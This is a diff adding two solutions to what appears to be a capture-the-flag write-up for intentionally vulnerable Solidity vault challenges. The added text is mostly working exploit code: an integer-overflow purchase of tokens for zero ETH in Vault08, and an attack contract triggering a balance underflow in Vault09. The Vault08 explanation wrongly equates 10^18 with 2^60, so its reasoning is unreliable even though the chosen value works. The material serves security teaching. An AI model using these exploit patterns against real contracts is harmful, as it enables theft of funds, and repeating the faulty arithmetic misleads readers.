@@ -259,4 +259,93 @@ const tx = await vault.breachVault(hashedPassword);
 await tx.wait();
 \end{minted}
 
+\subsection*{Vault08: Tokens for Free}
+
+To breach \texttt{Vault08}, you need to exploit an integer overflow vulnerability in the \texttt{buyTokens} function. Since the contract uses Solidity 0.7.6, which lacks built-in protection against overflow, you can find a value for \texttt{numTokens} that causes \texttt{numTokens * TOKEN\_PRICE} to overflow to exactly 0. This allows you to purchase tokens without paying any ETH.
+
+To achieve this, use a value for \texttt{numTokens} that, when multiplied by 1 ether ($10^{18}$), overflows and wraps around to exactly 0 in a uint256. A perfect value for this is $2^{238}$, since $2^{238} \times 10^{18} = 2^{238} \times 2^{60} \approx 2^{298}$, which exceeds the maximum uint256 value ($2^{256} - 1$) and wraps around to 0.
+
+\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
+// Connect to the vault contract as the player
+const playerVault = vault.connect(player);
+
+// Calculate the token amount that will cause an overflow
+// 2^238 is chosen because when multiplied by 1 ether (10^18), 
+// it will overflow exactly to 0 in Solidity 0.7.6
+const numTokens = BigInt(1) << BigInt(238);
+
+// Call buyTokens with 0 ether value
+// Due to integer overflow, numTokens * TOKEN_PRICE will be 0
+await playerVault.buyTokens(numTokens, { value: 0 });
+
+// Verify that we received the tokens
+const playerBalance = await vault.tokenBalances(playerAddress);
+console.log("Player token balance:", playerBalance.toString());
+
+// Call breachVault to complete the challenge
+await playerVault.breachVault();
+\end{minted}
+
+\subsection*{Vault09: Less Is More}
+
+To breach \texttt{Vault09}, you need to exploit an integer underflow vulnerability in the \texttt{transferFrom} function. The key observation is that the contract checks if the message sender has enough tokens, but not whether the \texttt{from} address has enough tokens. This allows you to cause an underflow in the \texttt{tokenBalances[from] -= amount} operation.
+
+First, deploy an attack contract that will interact with the vulnerable vault. Then, from your account (which starts with 1 token), approve the attack contract to spend tokens on your behalf. Next, have the attack contract call \texttt{transferFrom} to transfer more tokens than you actually have, causing an integer underflow in your token balance.
+
+\begin{lstlisting}[language=Solidity]
+// SPDX-License-Identifier: MIT
+pragma solidity 0.7.6;
+
+interface IVault09 {
+    function transferFrom(address from, address to, uint256 amount) external;
+}
+
+contract Vault09Attack {
+    // Reference to the vulnerable vault contract
+    IVault09 public vault;
+    // Address of the player who deployed this contract
+    address immutable playerAddress;
+    
+    constructor(address _vaultAddress) {
+        vault = IVault09(_vaultAddress);
+        playerAddress = msg.sender;
+    }
+    
+    /**
+     * @notice Performs the attack by triggering an underflow in the vault contract
+     * @dev This exploit works because Solidity 0.7.6 doesn't have default overflow/underflow protection
+     */
+    function attack() external {      
+        // Transfer 1 token from player that has 0 tokens 
+        // The player amount will underflow and become 2**256 - 1
+        vault.transferFrom(playerAddress, address(this), 1);
+    }
+}
+\end{lstlisting}
+
+\noindent
+Complete the attack with the following JavaScript code:
+
+\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
+// Deploy the attacker contract from the player's account.
+attackVault = await ethers.deployContract("Vault09Attack", [vault.target], player);
+await attackVault.waitForDeployment();
+
+console.log("Exploit contract deployed at:", attackVault.target);
+
+// Player approves the exploit contract to spend any 2 tokens
+await vault.connect(player).approve(attackVault.target, 2);
+
+// Player transfers 1 token to the attack contract
+await vault.connect(player).transferFrom(playerAddress, attackVault.target, 1);
+
+// Execute the attack
+const tx = await attackVault.attack();
+await tx.wait();
+
+// Break the vault
+await vault.connect(player).breachVault();
+\end{minted}
+
+
 \end{document}
